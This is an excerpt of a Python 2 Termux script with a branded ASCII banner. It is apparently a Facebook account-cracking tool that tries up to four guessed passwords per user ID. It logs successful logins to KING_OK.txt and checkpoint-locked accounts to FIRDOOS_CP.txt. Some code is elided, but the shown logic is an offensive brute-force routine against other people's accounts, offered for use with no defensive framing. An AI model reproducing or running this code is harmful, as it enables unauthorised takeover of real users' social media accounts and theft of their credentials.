...
os.system('clear')
logo = """
\033[1;93m _     ___________ ___  ______ 
\033[1;92m| |   |  _  |  ___/ _ \ | ___ \
\033[1;91m| |   | | | | |_ / /_\ \| |_/ /
\033[1;94m| |   | | | |  _||  _  ||    / 
\033[1;95m| |___\ \_/ / |  | | | || |\ \ 
\033[1;94m\_____/\___/\_|  \_| |_/\_| \_|
\033[1;94m═══════•×•×•×•×•×•×•×•×•×•×•×•×•×•×═══════
\033[1;96m➣ 𝑂𝑤𝑛𝑒𝑟 : \033[1;97mFIRDOOS
\033[1;96m➣ Ƒß  : \033[1;97mLOFARI
\033[1;96m➣ 𝑄𝑢𝑒𝑒𝑛  : \033[1;97m  TERMUX
\033[1;95m➣ DIR WALY SMART LOFAR
\033[1;94m═══════•×•×•×•×•×•×•×•×•×•×•×•×•×•×═══════"""
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92m ITZ BRAND LOFAR\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[LOFAR-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/KING_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[LOFAR-CP] ' + uid + ' | ' + pass1
                cp = open('FIRDOOS_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[LOFAR-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/KING_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[LOFAR-CP] ' + uid + ' | ' + pass2
                    cp = open('FIRDOOS_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[LOFAR-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/KING_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[LOFAR-CP] ' + uid + ' | ' + pass3
                        cp = open('FIRDOOS_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[LOFAR-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/KING_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[LOFAR-CP] ' + uid + ' | ' + pass4
                            cp = open('FIRDOOS_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
